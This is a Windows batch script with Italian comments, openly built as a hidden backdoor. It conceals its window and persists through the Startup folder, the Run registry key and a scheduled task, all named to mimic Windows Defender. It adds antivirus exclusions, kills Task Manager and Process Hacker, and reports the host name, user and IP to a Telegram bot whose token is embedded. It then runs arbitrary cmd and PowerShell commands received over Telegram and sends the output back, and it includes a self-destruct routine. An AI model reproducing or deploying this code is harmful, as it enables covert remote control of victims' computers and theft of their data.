@echo off & setlocal enableextensions enabledelayedexpansion

::: ### FASE 1 - INSTALLAZIONE INVISIBILE ###
if "%~1"=="--ghost" goto ghost_mode

::: ### Tecnica per nascondere completamente il CMD ###
echo Set objWSH = CreateObject("WScript.Shell") > "%TEMP%\invisible.vbs"
echo objWSH.Run "%~f0 --install", 0, False >> "%TEMP%\invisible.vbs"
wscript.exe "%TEMP%\invisible.vbs" & exit /b

:install
::: ### PERSISTENZA AVANZATA ###
:: 1. Copia in Startup (nome legittimo)
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderHelper.bat" >nul 2>&1

:: 2. Aggiungi al Run (Registry)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderUpdate" /t REG_SZ /d "\"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderHelper.bat\"" /f >nul 2>&1

:: 3. Task Scheduler (avvio a ogni login)
schtasks /create /tn "Microsoft\Windows Defender\MP Scheduled Scan" /tr "'%~f0' --ghost" /sc onlogon /ru System /f >nul 2>&1

:: 4. Esclusione da Windows Defender
powershell -nop -c "Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'; Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1

::: ### RIAVVIO IN MODALITÀ INVISIBILE ###
start "" /B "%~f0" --ghost & exit /b

::: ### FASE 2 - BACKDOOR INVISIBILE ###
:ghost_mode
::: ### CONFIGURAZIONE BOT ###
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "API_URL=https://api.telegram.org/bot%BOT_TOKEN%"

::: ### Notifica connessione (con info sistema) ###
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "IPv4"') do set "IP=%%b"
powershell -nop -c "$msg='🖥️ [%COMPUTERNAME%] - %USERNAME% online | IP: %IP%'; $null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=$msg' -UseBasicParsing"

::: ### ANTI-DEBUGGING ###
:: Termina task manager e process hacker
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im ProcessHacker.exe >nul 2>&1

::: ### MAIN LOOP ###
:command_loop
set "CMD="

::: ### Ricevi comandi da Telegram ###
for /f "delims=" %%A in ('powershell -nop -c "$resp=try{Invoke-WebRequest -Uri '!API_URL!/getUpdates?offset=-1' -UseBasicParsing|ConvertFrom-Json}catch{}; $resp.result[-1].message.text"') do (
    set "CMD=%%A"
)

::: ### Esegui comandi ###
if defined CMD (
    if "!CMD!"=="exit" (
        powershell -nop -c "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=❌ Session terminated' -UseBasicParsing"
        exit
    )

    if "!CMD:~0,4!"=="cmd:" (
        set "COMMAND=!CMD:~4!"
        for /f "delims=" %%B in ('cmd /c "!COMMAND! 2^>^&1"') do set "OUT=%%B"
        powershell -nop -c "$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=!OUT!' -UseBasicParsing"
    )

    if "!CMD:~0,3!"=="ps:" (
        set "PS_CMD=!CMD:~3!"
        powershell -nop -c "$out=try{iex '!PS_CMD!'|Out-String}catch{'ERROR: '+$$_};$null=Invoke-WebRequest -Uri '!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=$$out' -UseBasicParsing"
    )

    if "!CMD!"=="selfdestruct" (
        reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderUpdate" /f >nul 2>&1
        schtasks /delete /tn "Microsoft\Windows Defender\MP Scheduled Scan" /f >nul 2>&1
        del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderHelper.bat" >nul 2>&1
        powershell -nop -c "Remove-Item -Path '%~f0' -Force -ErrorAction SilentlyContinue"
        exit
    )
)

::: ### Delay randomico (evita detection) ###
powershell -nop -c "Start-Sleep -Seconds (Get-Random -Minimum 7 -Maximum 15)"
goto command_loop
